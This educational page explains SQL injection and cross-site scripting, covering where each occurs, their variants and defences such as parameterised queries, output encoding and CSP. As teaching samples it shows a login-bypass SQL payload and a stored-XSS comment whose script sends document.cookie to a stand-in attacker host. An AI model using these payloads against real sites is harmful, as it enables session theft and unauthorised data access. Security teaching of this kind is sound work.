What is SQL Injection?

A code-injection technique where untrusted input is inserted directly into a SQL statement — letting an attacker read, modify, or delete data the query was never meant to expose.

OWASP TOP 10 · A03 INJECTION FLAW SINCE 1998
login_query.sql
SELECT * FROM users
WHERE user = 'admin'
AND pass = '' OR '1'='1';

-- the quote closes early, "OR '1'='1"
-- makes the WHERE clause always true

Where SQL Injection Hides

Anywhere user input reaches a database query without sanitisation.

Login & Search Forms

Username, password and search fields fed straight into queries.

URL Parameters

?id=17 style parameters used to filter records server-side.

Cookies & Headers

User-Agent, Referer and session cookies trusted without checks.

REST & GraphQL APIs

JSON bodies concatenated into back-end queries.

Five Flavours of SQL Injection

In-band / Classic

Results are returned directly in the application's response — the fastest to exploit.

Union-based

UNION SELECT appends attacker-chosen columns onto the legitimate result set.

Blind (Boolean)

No data is shown — truth is inferred from subtle TRUE/FALSE page differences.

Time-based Blind

SLEEP() delays reveal answers through response timing instead of content.

Error-based

Verbose database error messages leak schema and data outright.

Closing the Door

Parameterised Queries

Bind variables so input is always data, never executable SQL.

ORM / Query Builders

Frameworks like Prisma or Hibernate escape input by default.

Strict Input Validation

Allow-list expected formats; reject everything else early.

Least-Privilege DB Accounts

App users can't DROP or ALTER — limit the blast radius.

Web Application Firewall

Catch known injection patterns before they reach the app.

safe_query.py
# parameterised — input can never break out
cursor.execute(
  "SELECT * FROM users WHERE user=%s AND pass=%s",
  (user_input, pass_input)

What is XSS?

victim-site.com/comments

Comment posted by "guest":

Nice post! <script>document.location='//evil.io?c='+document.cookie</script>

Rendered as live HTML for every visitor who views the page.

A vulnerability where untrusted input is rendered back into a page as executable script — running inside a real victim's browser, with their session and privileges.

Where XSS Slips In

Anywhere user content is echoed back into the DOM unescaped.

Comments & Reviews

User-generated text rendered as raw HTML.

Search Result Pages

"You searched for: <query>" echoed unescaped.

URL Fragments

DOM-based sinks reading location.hash directly.

Profile Fields

Bios and display names shown to every viewer.

Three Forms of XSS

Stored XSS

Payload is saved server-side — in a comment, profile or ticket — and fires for every visitor who later views it.

HIGHEST IMPACT

Reflected XSS

Payload rides in the URL or a form submission and is echoed straight back in that single response.

NEEDS A CLICKED LINK

DOM-based XSS

Client-side JavaScript writes untrusted data into the DOM — the server response itself is never touched.

PURELY CLIENT-SIDE

Neutralising the Payload

Output Encoding

Escape < > & " ' before rendering any user content as HTML.

Content Security Policy

Header that blocks inline & unauthorised script sources outright.

HttpOnly & Secure Cookies

Keeps session cookies unreadable to JavaScript entirely.

Sanitisation Libraries

DOMPurify-style filtering for any HTML you must allow.

Framework Auto-escaping

React, Vue & Angular escape bindings by default — avoid raw HTML injects.

Regular Security Testing

Automated scanners and manual pen-tests before every release.

03 · SYNTHESIS

SQL Injection vs XSS

SQL Injection

Targets the database
Executes on the server
Breaks confidentiality of data
Fixed with parameterised queries
VS

Cross-Site Scripting

Targets the user
Executes in the browser
Breaks trust of the session
Fixed with output encoding + CSP

Both share the same root cause — trusting input you don't control.
